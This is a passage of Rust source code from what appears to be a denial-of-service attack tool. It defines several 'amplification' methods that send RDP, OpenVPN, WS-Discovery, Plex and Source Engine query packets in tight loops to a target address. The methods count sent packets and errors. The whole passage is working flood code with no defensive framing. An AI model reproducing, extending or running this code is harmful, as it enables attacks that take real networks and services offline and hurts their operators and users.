            self.send_udp(&addr, &req);
        }
    }

    pub async fn rdp_amplification(&self) {
        let addr = format!("{}:3389", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let req: Vec<u8> = vec![
                0x03, 0x00, 0x00, 0x13, 0x0E, 0xE0, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x01, 0x00, 0x08, 0x00, 0x03,
                0x00, 0x00, 0x00,
            ];
            if let Ok(sa) = addr.parse::<SocketAddr>() {
                if let Ok(mut stream) = TcpStream::connect_timeout(&sa, Duration::from_millis(500)) {
                    if stream.write_all(&req).is_ok() {
                        self.ctx.sent.fetch_add(1, Ordering::Relaxed);
                    } else {
                        self.ctx.errors.fetch_add(1, Ordering::Relaxed);
                    }
                } else {
                    self.ctx.errors.fetch_add(1, Ordering::Relaxed);
                }
            }
        }
    }

    pub async fn openvpn_amplification(&self) {
        let addr = format!("{}:1194", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let mut rng = rand::thread_rng();
            let mut req = vec![0x38u8];
            req.extend(Self::rand_bytes(31));
            self.send_udp(&addr, &req);
        }
    }

    pub async fn wsd_amplification(&self) {
        let addr = format!("{}:3702", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let req = br#"<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</wsa:Action><wsa:MessageID>urn:uuid:00000000-0000-0000-0000-000000000000</wsa:MessageID></soap:Header><soap:Body><wsd:Probe><wsd:Types>wsdp:Device</wsd:Types></wsd:Probe></soap:Body></soap:Envelope>"#;
            self.send_udp(&addr, req);
        }
    }

    pub async fn plex_amplification(&self) {
        let addr = format!("{}:32414", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            self.send_udp(&addr, b"M-SEARCH * HTTP/1.0\r\n\r\n");
        }
    }

    pub async fn ark_amplification(&self) {
        let addr = format!("{}:27015", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let req = b"\xFF\xFF\xFF\xFFTSource Engine Query\x00";
            self.send_udp(&addr, req);
        }
    }
}
